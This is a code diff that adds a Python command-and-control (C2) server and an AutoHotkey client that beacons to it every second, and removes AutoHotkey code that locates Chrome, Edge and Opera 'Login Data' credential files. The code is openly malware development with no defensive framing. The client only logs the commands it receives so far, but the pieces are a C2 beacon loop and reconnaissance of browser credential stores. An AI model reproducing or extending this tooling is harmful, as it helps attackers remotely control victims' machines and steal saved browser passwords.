@@ -1,26 +1,65 @@
+server:
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import threading
+
+# Default command (client will get this until you change it)
+current_command = "Script_connect"
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        global current_command
+        self.send_response(200)
+        self.send_header("Content-type", "text/plain")
+        self.end_headers()
+        self.wfile.write(current_command.encode("utf-8"))
+
+def run_server():
+    server = HTTPServer(("0.0.0.0", 1187), Handler)
+    print("C2 server running on port 1187...")
+    server.serve_forever()
+
+# Start HTTP server in background thread
+threading.Thread(target=run_server, daemon=True).start()
+
+# Command input loop
+while True:
+    cmd = input("Enter C2 command: ")
+    if cmd.strip() == "":
+        continue
+    current_command = "Script_" + cmd.strip()
+    print(f"[+] Command updated to: {current_command}")
+
+
+
+client:
+
 #Requires AutoHotkey v2.0
 
-; Define browser paths based on %APPDATA%
-appData := A_AppData
-browserPaths := Map(
-    "Chrome", appData "\Local\Google\Chrome\User Data",
-    "MSEdge", appData "\Local\Microsoft\Edge\User Data",
-    "Opera", appData "\Opera Software\Opera Stable"
-)
+server := "http://127.0.0.1:1187/"
+driveSerial := "123456"
+url := server . driveSerial
 
-; Targeted sub-directory and file
-targetFile := "Local State\Login Data"
+lastCommand := ""
 
-; Loop through each browser
-for browser, path in browserPaths {
-    fullPath := path "\" targetFile
-    if DirExist(path) {
-        MsgBox "Found " browser " directory: " path
-        if FileExist(fullPath)
-            MsgBox "Login Data file found at: " fullPath
-        else
-            MsgBox "Login Data file not found in " browser
-    } else {
-        MsgBox "Directory not found for " browser
+Loop {
+    try {
+        response := UrlDownloadToVar(url)
+        if (response != lastCommand) {
+            FileAppend("New command received: " response "`n", A_ScriptDir "\c2_log.txt")
+            lastCommand := response
+        }
     }
+    catch {
+        FileAppend("C2 connection failed`n", A_ScriptDir "\c2_log.txt")
+    }
+    Sleep 1000
+}
+
+UrlDownloadToVar(url) {
+    whr := ComObject("WinHttp.WinHttpRequest.5.1")
+    whr.Open("GET", url, false)
+    whr.SetRequestHeader("User-Agent", "AutoHotkey")
+    whr.Send()
+    return whr.ResponseText
 }
